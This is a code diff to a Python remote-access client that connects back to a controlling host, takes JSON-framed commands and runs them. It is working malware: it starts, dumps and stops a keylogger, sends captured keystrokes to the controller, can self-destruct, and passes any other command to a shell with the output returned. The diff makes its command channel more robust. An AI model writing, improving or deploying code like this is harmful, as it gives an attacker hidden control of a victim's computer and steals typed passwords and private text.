@@ -15,15 +15,28 @@ client = socket.socket()
 client.connect((ip, port))
 print("connected")
 
+def send_response(data):
+    jsondata = json.dumps(data)
+    client.send(jsondata.encode())
+def receive_command():
+    data = ''
+    while True:
+        try:
+            data = data + client.recv(1024).decode().rstrip()
+            return json.loads(data)
+        except ValueError:
+            continue
+
 def execute_shell():
     while True:
-        command = client.recv(1024).decode()
+        command = receive_command()
 
         print(f"command received: {command}")
 
         if command == 'quit':
             try: keylog.self_destruct()
             except: pass
+            send_response("disconnected")
             break
         elif command[:2] == 'cd':
             try:
@@ -33,34 +46,27 @@ def execute_shell():
                 pass
                 
             finally:
-                client.send(os.getcwd().encode())
+                send_response(os.getcwd())
 
         elif command[:12] == 'keylog_start':
             keylog = KeyLogger()
             t = threading.Thread(target=keylog.start)
             t.start()
-            client.send(b'keylog started')
+            send_response("started")
 
         elif command[:11] == 'keylog_dump':
             try:
                 keys = keylog.readkeys()
-                print(keys)
-                client.send(keys.encode())
+                send_response(keys)
             except:
-                client.send(b'error')
+                send_response("no keylogs found")
 
         elif command[:11] == 'keylog_stop':
             keylog.self_destruct()
-            client.send(b'keylog stoped')
-            
+            send_response("keylog stopped")
+
         else:
             op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE, stdin=subprocess.PIPE)
-            client.send(op.stdout.read() + op.stderr.read())
-        
-        
+            send_response((op.stdout.read() + op.stderr.read()).decode()) 
 
 execute_shell()
-
-
-
-
